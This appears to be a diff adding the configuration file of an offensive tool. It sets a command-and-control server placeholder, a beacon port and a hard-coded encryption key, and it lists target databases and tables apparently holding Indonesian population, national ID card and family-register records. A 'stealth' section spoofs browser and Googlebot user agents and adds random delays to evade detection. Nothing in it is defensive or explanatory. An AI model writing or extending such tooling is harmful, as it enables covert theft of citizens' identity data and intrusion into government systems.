@@ -1,0 +1,13 @@
+# config.yaml
+c2:
+  url: "http://YOUR_C2:8080"
+  beacon_port: 443
+  encrypt_key: "SIAK2026!"
+
+siak:
+  default_dbs: ["siakad", "penduduk", "e_ktp"]
+  tables: ["penduduk", "nik", "kk", "users"]
+  
+stealth:
+  user_agents: ["Mozilla/5.0...", "Googlebot/2.1"]
+  delay_range: [1,5]  # Random delay
